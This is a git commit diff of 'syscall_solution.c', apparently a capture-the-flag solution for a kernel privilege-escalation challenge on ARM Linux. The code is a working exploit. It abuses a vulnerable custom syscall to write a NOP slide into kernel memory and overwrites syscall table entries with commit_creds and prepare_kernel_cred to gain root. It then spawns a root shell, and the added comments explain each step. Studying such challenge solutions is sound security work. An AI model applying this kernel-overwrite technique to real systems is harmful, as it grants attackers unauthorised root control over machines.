a1b2fb5c867f0ff1a5c1b1235631d9883171ac80
fueljuice <77461232+fueljuice@users.noreply.github.com>
2025-08-26 21:49:05 +0300

    Update syscall_solution.c

--- syscall_solution.c
+++ syscall_solution.c
@@ -7,15 +7,17 @@ unsigned int** sct = (unsigned int**)0x8000e348;
 int main()
 {
       
-        syscall(UPPER_SYSCALL, "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1", (0x8003f56c - 12) );
-        syscall(UPPER_SYSCALL,"\x60\xf5\x03\x80", &sct[67] );
-
-        syscall(UPPER_SYSCALL,"\x24\xf9\x03\x80", &sct[68] );
-
-        syscall(67,syscall(68,0));
-        
-        system("/bin/sh");
-        return 0;
+      char* slide = "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1";
+      syscall(UPPER_SYSCALL, slide , (0x8003f56c - 12) ); // inserting the nop slide
+      syscall(UPPER_SYSCALL,"\x60\xf5\x03\x80", &sct[67] ); //commit_cred into syscall at sct+67
+      
+      syscall(UPPER_SYSCALL,"\x24\xf9\x03\x80", &sct[68] ); //prepare_kernel_cred into the syscall at sct+68
+      
+      syscall(67,syscall(68,0)); //67 is overwritten with commit_cred and 68 is overwritten with prepare_kernel_cred
+      
+      system("/bin/sh");
+      return 0;
 }
 
-# gcc -o ex5 ex5.c
+
+
